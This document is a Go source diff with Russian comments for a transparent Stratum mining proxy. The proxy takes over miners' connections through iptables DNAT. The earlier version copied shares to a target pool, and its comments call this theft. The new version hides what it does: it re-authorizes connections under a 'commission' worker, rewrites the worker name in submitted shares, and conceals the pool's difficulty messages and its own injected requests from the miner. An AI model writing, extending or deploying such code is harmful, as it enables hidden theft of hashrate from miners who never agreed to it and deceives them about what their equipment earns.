@@ -1,3 +1,13 @@
+// Файл conn.go — обработка одного соединения майнера.
+//
+// Схема:
+//
+//	майнер <---> мы <---> реальный пул (адресат из iptables DNAT)
+//
+// Прокси прозрачно: каждая строка уходит байт-в-байт в обе стороны,
+// парсинг нужен ТОЛЬКО для подсчёта шар (mining.submit, ответы пула,
+// mining.set_difficulty). Всё, что не Stratum (TLS, HTTP, прочий TCP
+// из перехваченной подсети), пробросывается сырой трубой без разбора.
 package proxy
 
 import (
@@ -9,77 +19,63 @@ import (
 	"time"
 )
 
-// Таймауты и размеры буферов обработки одного соединения.
+// Таймауты и размеры буферов одной сессии.
 const (
-	// idleTimeout — таймаут неактивности ASIC-сессии (Stratum). Если от
-	// майнера не пришло данных дольше — соединение разрывается (ASIC «умер»).
-	// Требование заказчика: сброс «умершей» сессии ~10 минут.
+	// idleTimeout — простой майнера или пула: соединение считается мёртвым.
 	idleTimeout = 10 * time.Minute
 
-	// upstreamDialTimeout — таймаут установки TCP-соединения с пулом.
+	// upstreamDialTimeout — таймаут TCP-соединения с реальным пулом.
 	upstreamDialTimeout = 10 * time.Second
 
-	// writeTimeout — таймаут записи в пул. TCP-буфер пула может быть полон —
-	// без таймаута writeLine зависла бы навсегда, съев goroutine. С таймаутом
-	// соединение рвётся и ресурсы освобождаются (fail-open уровня сессии).
+	// writeTimeout — таймаут записи: TCP-буфер может быть полон, без
+	// дедлайна goroutine завис бы навсегда.
 	writeTimeout = time.Minute
 
-	// sniffTimeout — сколько ждём первые байты, чтобы понять: это Stratum
-	// или просто поток (TLS/HTTP/…). Даже медленный ASIC шлёт subscribe сразу.
+	// sniffTimeout — сколько ждём первые байты, чтобы определить протокол.
 	sniffTimeout = 10 * time.Second
+
+	// commissionAckTimeout — сколько ждём ответ пула на изъятую шару, прежде
+	// чем отправить следующую (сериализация изъятия). Молчание пула не
+	// должно вешать соединение — по таймауту продолжаем.
+	commissionAckTimeout = 10 * time.Second
 
 	// lineBuf / maxLineSize — буфер строки Stratum (JSON редко > 1КБ).
 	lineBuf     = 4 * 1024
 	maxLineSize = 16 * 1024
 )
 
-// ProxyPass — параметры проксирования одного соединения: куда ходить по
-// умолчанию (fallback) и как определять реальный адресат.
+// ProxyPass — параметры проксирования одного соединения.
 type ProxyPass struct {
-	// ListenAddr адрес нашего listener (host:port). Нужен, чтобы отличить
-	// «прямой» коннект от DNAT-перенаправленного (см. dest.go isProxyAddr).
+	// ListenAddr адрес нашего listener — чтобы отличить прямой коннект
+	// от DNAT-перенаправленного (см. dest.go isProxyAddr).
 	ListenAddr string
 
-	// Fallback реальный пул из конфига (upstream_pool) — используется, если
-	// прозрачность выключена или исходный адресат не удалось восстановить
-	// (локальный тест без iptables).
+	// Fallback реальный пул из конфига (upstream_pool): используется при
+	// прямом подключении к прокси мимо iptables (локальный тест).
 	Fallback string
 
-	// FallbackSSL использовать TLS при подключении к Fallback (для прямого
-	// теста без iptables). В прозрачном режиме TLS не терминируем никогда:
-	// клиент сам держит TLS с пулом через нашу байтовую трубу.
+	// FallbackSSL TLS к Fallback. В прозрачном режиме не применяется:
+	// клиент сам держит TLS-сессию с пулом сквозь нашу трубу.
 	FallbackSSL bool
 
-	// Transparent включает определение реального адресата через
-	// SO_ORIGINAL_DST (iptables DNAT). По умолчанию true (см. config).
+	// Transparent включает определение адресата через SO_ORIGINAL_DST.
 	Transparent bool
 
-	// ResolveDest — необязательный переопределитель определения адресата.
-	// Нужен только для тестов: позволяет эмулировать несколько пулов
-	// (разные IP:port) без root и реального iptables. Если задан, вызывается
-	// вместо resolveDestination и возвращает (адресат, ssl). В проде — nil.
+	// ResolveDest переопределение адресата — ТОЛЬКО для тестов
+	// (эмуляция DNAT без root и iptables). В проде nil.
 	ResolveDest func(net.Conn) (string, bool)
+
+	// Commission сборщик комиссии; nil — комиссия выключена.
+	Commission *Commission
 }
 
-// HandleConnection обрабатывает одно соединение от ASIC-майнера (или любого
-// другого TCP-потока из разрешённой подсети).
-//
-// Схема:
-//   клиент <---> мы <---> реальный пул (настоящий адресат из iptables DNAT)
-//                    |
-//                    +--> целевой пул («укушенная» копия шары)
-//
-// В прозрачном режиме адресат каждого соединения свой (у разных клиентов
-// разные пулы). Для каждого соединения сначала смотрим первые строки:
-//
-//   - похоже на Stratum (JSON с методом mining.*) → построчный разбор,
-//     копирование каждой mining.submit в реальный пул + опциональная «кража»;
-//   - всё остальное (TLS, HTTP, что угодно ещё из подсети) → сквозная
-//     байтовая труба без разбора (прозрачно, как требует заказчик).
-func HandleConnection(clientConn net.Conn, pass ProxyPass, stealer *ShareStealer, disc *Discovery) {
+// HandleConnection обслуживает одно соединение от майнера до самого конца:
+// определяет адресат, подключается к пулу, проксирует обе стороны и
+// наполняет реестр статистики шар.
+func HandleConnection(clientConn net.Conn, pass ProxyPass, stats *Stats) {
 	defer clientConn.Close()
 
-	// --- 1. Определяем настоящий адресат (пул конкретного клиента) ---
+	// --- 1. Реальный адресат (пул именно этого майнера) ---
 	var dest string
 	var destSSL bool
 	if pass.ResolveDest != nil {
@@ -87,185 +83,395 @@ func HandleConnection(clientConn net.Conn, pass ProxyPass, stealer *ShareStealer
 	} else {
 		dest, destSSL = resolveDestination(clientConn, pass)
 	}
+	if dest == "" {
+		log.Printf("[CONN] %s: не удалось определить адресат (нет SO_ORIGINAL_DST и upstream_pool)", clientConn.RemoteAddr())
+		return
+	}
 
-	// --- 1a. Регистрируем пул в реестре «базы» (пул+воркер) ---
-	// Даже если пул сейчас недоступен, факт обращения полезен оператору.
-	disc.ObservePool(dest)
+	source := sourceHost(clientConn.RemoteAddr())
+	se := newSession(stats, dest, source, pass.Commission)
+	defer se.close()
 
-	// --- 2. Подключаемся к нему (TCP; TLS — только в fallback-режиме). ---
+	// --- 2. Подключаемся к реальному пулу ---
 	upstream, err := dialUpstream(dest, destSSL)
 	if err != nil {
-		log.Printf("[CONN] upstream dial %s: %v", dest, err)
+		log.Printf("[CONN] upstream %s: %v", dest, err)
 		return
 	}
 	defer upstream.Close()
 
-	log.Printf("[CONN] %s <-> %s (listen=%s)", clientConn.RemoteAddr(), dest, pass.ListenAddr)
+	log.Printf("[CONN] %s -> %s", source, dest)
 
-	// --- 3. Смотрим первые байты: Stratum или прозрачный поток? ---
-	// Читаем через bufio.Reader, чтобы прочитанное можно было переиспользовать
-	// в обоих режимах (raw io.Copy или scanner). Возвращённые sniffedLines уже
-	// извлечены из буфера reader и должны быть пересланы в пул вызывающим.
+	// --- 3. Определяем протокол по первым байтам ---
+	// Stratum начинается с JSON-строки ('{'), всё остальное (TLS-хендшейк,
+	// HTTP, бинарь) уходит сырой трубой.
 	reader := bufio.NewReaderSize(clientConn, lineBuf)
 	clientConn.SetReadDeadline(time.Now().Add(sniffTimeout))
-	stratum, sniffedLines := sniffStratum(reader)
+	stratum, sniffed := sniffStratum(reader)
 	clientConn.SetReadDeadline(time.Time{})
 
-	// Пересылаем всё, что sniffer уже прочитал и извлёк из буфера reader.
-	// Без этого pipeMinerToPool (или io.Copy) заблокируется на чтении следующей
-	// строки от клиента — а клиент ждёт ответа на подписку и стоит.
-	if len(sniffedLines) > 0 {
-		upstream.SetWriteDeadline(time.Now().Add(writeTimeout))
-		for _, line := range sniffedLines {
-			if _, err := upstream.Write(line); err != nil {
-				log.Printf("[CONN] write sniffed to upstream: %v", err)
-				return
-			}
+	// Прочитанное sniffer-ом нужно переслать сразу: без этого пул не
+	// получит subscribe и соединение «повиснет» до таймаута.
+	for _, piece := range sniffed {
+		if _, err := upstream.Write(piece); err != nil {
+			log.Printf("[CONN] write sniffed to upstream: %v", err)
+			return
 		}
 	}
 
+	// --- 4. Две стороны потока ---
 	done := make(chan struct{}, 2)
-
 	if stratum {
-		// Поток 1: майнер -> пул, построчно, с перехватом mining.submit.
 		go func() {
-			pipeMinerToPool(clientConn, reader, dest, upstream, stealer, disc)
+			pipeMinerToPool(clientConn, reader, upstream, se, pass.Commission)
+			done <- struct{}{}
+		}()
+		go func() {
+			pipePoolToMiner(upstream, clientConn, se)
 			done <- struct{}{}
 		}()
 	} else {
-		// Поток 1: не-стратум — прозрачная байтовая труба в обе стороны.
 		go func() {
-			if _, err := io.Copy(upstream, reader); err != nil {
-				log.Printf("[CONN] miner->pool copy: %v", err)
-			}
+			io.Copy(upstream, reader)
+			done <- struct{}{}
+		}()
+		go func() {
+			io.Copy(clientConn, upstream)
 			done <- struct{}{}
 		}()
 	}
 
-	// Поток 2: пул -> майнер, всегда прозрачный passthrough.
-	go func() {
-		if _, err := io.Copy(clientConn, upstream); err != nil {
-			log.Printf("[CONN] pool->miner copy: %v", err)
-		}
-		done <- struct{}{}
-	}()
-
-	// Ждём завершения любого из потоков — это означает разрыв соединения.
+	// Первая завершившаяся сторона = обрыв. Закрываем обе, ждём вторую —
+	// только после этого сессия считается закрытой (никаких гонок с
+	// deferred se.close()).
 	<-done
-	log.Printf("[DISCONNECT] %s", clientConn.RemoteAddr())
+	clientConn.Close()
+	upstream.Close()
+	<-done
+	log.Printf("[DISCONNECT] %s (pool=%s)", source, dest)
 }
 
-// dialUpstream создаёт TCP или TLS соединение с пулом.
+// dialUpstream создаёт TCP или TLS соединение с реальным пулом.
 func dialUpstream(addr string, ssl bool) (net.Conn, error) {
 	if ssl {
-		// InsecureSkipVerify — публичные пулы часто с самоподписанными
-		// сертификатами; необходимо для работы (риск осознан, см. ARCHITECTURE).
+		// InsecureSkipVerify — публичные пулы часто работают на
+		// самоподписанных сертификатах (риск осознан: это fallback).
 		return tls.Dial("tcp", addr, &tls.Config{InsecureSkipVerify: true})
 	}
 	return net.DialTimeout("tcp", addr, upstreamDialTimeout)
 }
 
-// sniffStratum определяет, ведёт ли соединение Stratum-майнер: реальный ASIC
-// начинает с mining.subscribe / mining.authorize (JSON, метод "mining.*").
-// Читаем не более нескольких строк; прочитанные строки возвращаются — это
-// данные, которые sniffer уже извлёк из буфера, их обязан переслать вызывающий.
-// Таймаут на чтение (sniffTimeout) уже выставлен вызывающей стороной.
-func sniffStratum(reader *bufio.Reader) (stratum bool, lines [][]byte) {
-	for i := 0; i < 3; i++ {
-		line, err := reader.ReadBytes('\n')
-		if err != nil {
-			// Нет данных (таймаут, обрыв, TLS-блоб без \n) — это не стратум:
-			// обрабатываем как обычный поток.
-			return false, lines
-		}
-		lines = append(lines, line)
-		if LooksLikeStratum(line) {
-			return true, lines
-		}
+// sourceHost превращает RemoteAddr в чистый IP (без эфемерного порта).
+func sourceHost(addr net.Addr) string {
+	if addr == nil {
+		return ""
 	}
-	return false, lines
+	host, _, err := net.SplitHostPort(addr.String())
+	if err != nil {
+		return addr.String()
+	}
+	return host
 }
 
-// pipeMinerToPool копирует данные от майнера к пулу построчно (Stratum V1:
-// каждое сообщение = одна строка JSON + '\n'). Для каждой строки решаем:
-// это mining.submit? Если да и stealer решил «укусить» — копия уходит
-// целевому пулу; оригинал ВСЕГДА идёт реальному пулу.
+// sniffStratum определяет протокол соединения по первым байтам.
 //
-// Заодно наполняем реестр discovery: authorize/submit дают воркера,
-// submit — счётчики (pool+worker), что нужно для правил кражи (этап 4).
+// Возвращает режим (stratum/сырой) и ВСЕ прочитанные байты — их обязан
+// переслать вызывающий: sniffer уже извлёк их из буфера reader.
 //
-// clientConn нужен для таймаутов чтения (deadline ставится на сам TCP-сокет,
-// сканер читает через буфер reader). pool — адресат этого соединения.
-func pipeMinerToPool(clientConn net.Conn, reader *bufio.Reader, pool string, dst net.Conn, stealer *ShareStealer, disc *Discovery) {
+// Логика: Stratum V1 — построчный JSON, первая строка начинается с '{'.
+// Первый байт не '{' (TLS 0x16, HTTP 'G'…) → сырой поток сразу, без
+// ожидания таймаута. Началось с '{' — дочитываем строки (до трёх) и
+// ищем метод mining.*.
+func sniffStratum(reader *bufio.Reader) (bool, [][]byte) {
+	var consumed [][]byte
+	for i := 0; i < 3; i++ {
+		b, err := reader.ReadByte()
+		if err != nil {
+			return false, consumed
+		}
+		if b != '{' {
+			consumed = append(consumed, []byte{b})
+			return false, consumed
+		}
+		rest, err := reader.ReadSlice('\n')
+		line := append([]byte{b}, rest...)
+		consumed = append(consumed, line)
+		if err != nil {
+			// Обрыв/таймаут посреди строки: отдаём что есть, разбирать
+			// нечего (не-стратум режим безопасен — труба всё пропустит).
+			return false, consumed
+		}
+		if LooksLikeStratum(line) {
+			return true, consumed
+		}
+	}
+	return false, consumed
+}
+
+// pipeMinerToPool ведёт поток майнер → пул построчно и считает шары:
+// authorize привязывает воркера, submit штампуется сложностью и
+// регистрируется в таблице ожидающих ответа.
+//
+// Комиссия: пул привязывает воркер к mining.authorize, поэтому одной подмены
+// params[0] мало. На время изъятия прокси отправляет в пул служебный
+// mining.authorize с commission_worker (feeAuth), а params[0] шар приводит к
+// тому же воркеру; когда бюджет исчерпан — возвращает authorize на воркер
+// майнера. job_id/extranonce1 соединения сохраняются, шары остаются валидными.
+func pipeMinerToPool(clientConn net.Conn, reader *bufio.Reader, dst net.Conn, se *session, commission *Commission) {
 	scanner := bufio.NewScanner(reader)
 	scanner.Buffer(make([]byte, lineBuf), maxLineSize)
 
-	// Таймаут чтения: если майнер «молчит» дольше idleTimeout — Read вернёт
-	// таймаут, соединение закроется. Deadline обновляется при каждом чтении.
-	clientConn.SetReadDeadline(time.Now().Add(idleTimeout))
-
-	// Источник (IP клиента) — один раз, для записи в реестр.
-	source := ""
-	if a := clientConn.RemoteAddr(); a != nil {
-		source = a.String()
+	// feeAuth — соединение сейчас авторизовано под commission_worker.
+	feeAuth := false
+	// feeWorker — имя воркера комиссии, под которым идёт текущее изъятие.
+	// Фиксируется при открытии служебного authorize: ротация имени (новый
+	// воркер на каждое окно) не должна рассинхронизировать authorize и
+	// submit — пул зачисляет шары на того воркера, которому отдан authorize.
+	feeWorker := ""
+	writeAuthorize := func(worker string) bool {
+		dst.SetWriteDeadline(time.Now().Add(writeTimeout))
+		if err := writeLine(dst, miningAuthorizeLine(worker, commissionAuthTag)); err != nil {
+			log.Printf("[CONN] miner->pool authorize: %v", err)
+			return false
+		}
+		return true
 	}
 
-	for scanner.Scan() {
-		// Получили данные — отодвигаем таймаут неактивности ещё на idleTimeout.
-		clientConn.SetReadDeadline(time.Now().Add(idleTimeout))
+	// writeSuggestDifficulty просит у пула закрепить сложность сессии на
+	// указанном уровне (mining.suggest_difficulty). Ответ пула на этот id
+	// майнеру не показывается.
+	writeSuggestDifficulty := func(diff float64) bool {
+		dst.SetWriteDeadline(time.Now().Add(writeTimeout))
+		if err := writeLine(dst, miningSuggestDifficultyLine(diff, commissionDiffTag)); err != nil {
+			log.Printf("[CONN] miner->pool suggest_difficulty: %v", err)
+			return false
+		}
+		return true
+	}
 
-		line := scanner.Bytes()
-
-		// Scanner переиспользует буфер, поэтому сохраняем КОПИЮ строки —
-		// она может понадобиться в отдельной goroutine (асинхронная отправка).
-		lineCopy := make([]byte, len(line))
-		copy(lineCopy, line)
-
-		// Наполняем «базу» пул+воркер из живого трафика.
-		switch {
-		case IsMinerAuthorize(lineCopy):
-			disc.ObserveWorker(pool, ExtractWorkerFromAuthorize(lineCopy), source)
-		case IsMinerSubmit(lineCopy):
-			worker := ExtractWorkerFromSubmit(lineCopy)
-			disc.ObserveSubmit(pool, worker, source)
-
-			// Оригинал ВСЕГДА уходит — иначе майнер не получит ответ на submit.
-			// Для submit-ов дополнительно решаем, не «укусить» ли копию, с
-			// учётом правил allowlist (пул+воркер, этап 4).
-			if stealer.ShouldStealFor(pool, worker) {
-				go func(data []byte) {
-					if err := stealer.ForwardToTarget(data); err != nil {
-						log.Printf("[REDIRECT] forward to target: %v", err)
-					}
-				}(lineCopy)
+	// ensureFeeAuth переводит соединение на воркера комиссии (если ещё не
+	// переведено). Подавление сложности включается ДО отправки authorize:
+	// пул шлёт mining.set_difficulty сразу следом за сменой воркера, и он
+	// не должен ни попасть в сессию, ни уйти майнеру.
+	ensureFeeAuth := func() bool {
+		if feeAuth {
+			return true
+		}
+		se.setFeeActive(true)
+		feeWorker = commission.WindowWorker()
+		if !writeAuthorize(feeWorker) {
+			se.setFeeActive(false)
+			return false
+		}
+		feeAuth = true
+		// Просим пул держать сложность сессии на уровне сложности
+		// майнера: иначе vardiff воркера комиссии обрушит её, и изъятые
+		// шары будут зачтены в десятки раз дешевле.
+		if commission.SuggestDifficulty() {
+			if d := se.difficulty(); d > 0 {
+				writeSuggestDifficulty(d)
+				// Ждём, пока пул применит предложенную сложность: пока в
+				// сессии держится vardiff воркера комиссии, любые шары
+				// (в том числе изъятые) зачисляются по его цене. Ожидание
+				// короткое — за это время майнер просто не успевает отдать
+				// очередную шару.
+				if !se.waitFeeDiff(d, commissionDiffWaitTimeout, commissionDiffGrace) {
+					log.Printf("[COMMISSION] пул %s не подтвердил сложность %g за %s — изъятые шары могут быть зачтены дешевле (сложность воркера комиссии %g)",
+						se.pool, d, commissionDiffWaitTimeout, se.feeDifficulty())
+				}
 			}
 		}
+		return true
+	}
 
-		// Таймаут записи, чтобы зависшая запись не держала goroutine вечно.
+	// restoreMinerAuth возвращает соединение воркеру майнера: с этого
+	// момента сложность пула снова можно отдавать майнеру.
+	restoreMinerAuth := func() {
+		if !feeAuth {
+			return
+		}
+		if w := se.workerName(); w != "" && writeAuthorize(w) {
+			feeAuth = false
+			se.setFeeActive(false)
+			// Возвращаем сложность сессии на уровень сложности майнера:
+			// после служебного authorize пул мог оставить в сессии vardiff
+			// воркера комиссии, и шары майнера стали бы зачисляться дешевле.
+			if commission != nil && commission.SuggestDifficulty() {
+				if d := se.difficulty(); d > 0 {
+					writeSuggestDifficulty(d)
+				}
+			}
+		}
+	}
+
+	for {
+		clientConn.SetReadDeadline(time.Now().Add(idleTimeout))
+		if !scanner.Scan() {
+			break
+		}
+		line := scanner.Bytes()
+
+		if IsMinerSubmit(line) {
+			id, _ := SubmitID(line)
+			if id != "" && commission != nil && commission.Enabled() && !se.feeDeniedNow() {
+				if commission.reserve(se.pool) {
+					// Сначала открываем служебную авторизацию: она
+					// фиксирует имя воркера, под которым пойдёт эта
+					// шара (authorize и submit должны совпадать).
+					rewritten, err := []byte(nil), error(nil)
+					if ensureFeeAuth() {
+						rewritten, err = rewriteSubmitWorker(line, feeWorker)
+					}
+					if err == nil && rewritten != nil {
+						diff := se.markCommissionSubmit(id, feeWorker)
+						ack := se.armCommissionAck()
+						instant, avg := commission.countSteal(se.pool, diff)
+						log.Printf("[COMMISSION] шара забрана воркеру %q (пул %s, id %s, diff %g, сложность майнера %g, мгновенно %.2f TH/s, avg %.2f TH/s)",
+							feeWorker, se.pool, id, diff, se.difficulty(),
+							instant/1e12, avg/1e12)
+						line = rewritten
+						dst.SetWriteDeadline(time.Now().Add(writeTimeout))
+						if werr := writeLine(dst, line); werr != nil {
+							log.Printf("[CONN] miner->pool write: %v", werr)
+							return
+						}
+						// Следующую шару берём только после ответа пула на
+						// эту: иначе порция уходит залпом и пул путает шары.
+						if !waitCommissionAck(ack, commissionAckTimeout) {
+							log.Printf("[COMMISSION] пул %s не ответил на шару id %s за %s — продолжаем",
+								se.pool, id, commissionAckTimeout)
+						}
+						continue
+					}
+					// Не удалось — fail-open: шару не трогаем.
+					if feeAuth {
+						restoreMinerAuth()
+					}
+					commission.countFailed(se.pool)
+				} else if feeAuth {
+					// Бюджет исчерпан — возвращаем соединение майнеру.
+					restoreMinerAuth()
+				}
+			} else if feeAuth {
+				// Комиссия отключена/отклонена пулом — вернуть воркер майнера.
+				restoreMinerAuth()
+			}
+			se.submit(id, WorkerFromSubmit(line))
+		} else if IsMinerAuthorize(line) {
+			se.authorize(WorkerFromAuthorize(line))
+		}
+
 		dst.SetWriteDeadline(time.Now().Add(writeTimeout))
-		if err := writeLine(dst, lineCopy); err != nil {
-			log.Printf("[CONN] write to upstream: %v", err)
+		if err := writeLine(dst, line); err != nil {
+			log.Printf("[CONN] miner->pool write: %v", err)
 			return
 		}
 	}
+	logReadErr("miner", clientConn, scanner.Err())
+}
 
-	if err := scanner.Err(); err != nil {
-		// При превышении idleTimeout ловим таймаут и закрываем «умершую» сессию.
-		if ne, ok := err.(net.Error); ok && ne.Timeout() {
-			log.Printf("[CONN] idle timeout, closing session: %s", clientConn.RemoteAddr())
-		} else if err == bufio.ErrTooLong {
-			log.Printf("[CONN] oversized stratum line, closing: %s", clientConn.RemoteAddr())
-		} else {
-			log.Printf("[CONN] scanner: %v", err)
+// pipePoolToMiner ведёт поток пул → майнер: забирает set_difficulty
+// (сложность для хешрейта) и ответы на шары (accepted/rejected).
+func pipePoolToMiner(src net.Conn, dst net.Conn, se *session) {
+	scanner := bufio.NewScanner(src)
+	scanner.Buffer(make([]byte, lineBuf), maxLineSize)
+
+	for {
+		src.SetReadDeadline(time.Now().Add(idleTimeout))
+		if !scanner.Scan() {
+			break
 		}
+		line := scanner.Bytes()
+
+		if diff, ok := ParseSetDifficulty(line); ok {
+			if se.suppressDifficulty() {
+				// Соединение сейчас под воркером комиссии: сложность от
+				// пула относится к нему (vardiff), а не к майнеру. Если её
+				// отдать ASIC — майнер начнёт сдавать копеечные шары, а его
+				// сложность в сессии затрётся чужой.
+				se.setFeeDiff(diff)
+				log.Printf("[COMMISSION] сложность %g от пула скрыта от майнера (соединение под воркером комиссии, сложность сессии %g)",
+					diff, se.difficulty())
+				continue
+			}
+			if prev := se.difficulty(); prev != diff {
+				log.Printf("[SESSION] пул %s сменил сложность сессии: %g -> %g", se.pool, prev, diff)
+			}
+			se.setDifficulty(diff)
+		} else if resp, ok := ParsePoolResponse(line); ok {
+			if resp.ID == commissionAuthID {
+				// Ответ на служебный authorize: майнеру не показываем,
+				// но пишем в лог — по нему видно, принял ли пул смену воркера.
+				if resp.Accepted {
+					log.Printf("[COMMISSION] пул %s подтвердил переавторизацию", se.pool)
+					if se.commission != nil {
+						se.commission.reportAuthOK(se.pool)
+					}
+				} else {
+					log.Printf("[COMMISSION] пул %s ОТКЛОНИЛ переавторизацию: %s — изъятие на этом соединении остановлено",
+						se.pool, resp.Error)
+					se.denyFee()
+					if se.commission != nil {
+						se.commission.reportDeny(se.pool)
+					}
+				}
+				continue
+			}
+			if resp.ID == commissionDiffID {
+				// Ответ на наш mining.suggest_difficulty: майнеру не
+				// показываем. Пул подтвердил, что закрепит сложность
+				// сессии на уровне сложности майнера.
+				if resp.Accepted {
+					log.Printf("[COMMISSION] пул %s подтвердил закрепление сложности %g", se.pool, se.difficulty())
+				} else {
+					log.Printf("[COMMISSION] пул %s отклонил mining.suggest_difficulty: %s", se.pool, resp.Error)
+				}
+				continue
+			}
+			se.resolve(resp)
+		} else if jobID, ok := JobIDFromNotify(line); ok {
+			se.setJobID(jobID)
+		}
+
+		dst.SetWriteDeadline(time.Now().Add(writeTimeout))
+		if err := writeLine(dst, line); err != nil {
+			log.Printf("[CONN] pool->miner write: %v", err)
+			return
+		}
+	}
+	logReadErr("pool", src, scanner.Err())
+}
+
+// waitCommissionAck ждёт ответа пула на текущую изъятую шару. Возвращает
+// false, если за отведённое время ответа не было (соединение продолжает
+// работать, просто без сериализации по этой шаре).
+func waitCommissionAck(ch chan struct{}, d time.Duration) bool {
+	select {
+	case <-ch:
+		return true
+	case <-time.After(d):
+		return false
 	}
 }
 
-// writeLine пишет данные и терминальный '\n' в dst.
+// writeLine пишет строку и терминальный '\n' (scanner его съел).
 func writeLine(dst io.Writer, data []byte) error {
 	buf := make([]byte, 0, len(data)+1)
 	buf = append(buf, data...)
 	buf = append(buf, '\n')
 	_, err := dst.Write(buf)
 	return err
+}
+
+// logReadErr различает таймаут неактивности (майнер/пул «умер») и прочие
+// ошибки чтения — полезно для диагностики в логах.
+func logReadErr(side string, conn net.Conn, err error) {
+	if err == nil || err == io.EOF {
+		return
+	}
+	if ne, ok := err.(net.Error); ok && ne.Timeout() {
+		log.Printf("[CONN] idle timeout (%s), closing: %s", side, conn.RemoteAddr())
+		return
+	}
+	log.Printf("[CONN] read %s: %v", side, err)
 }
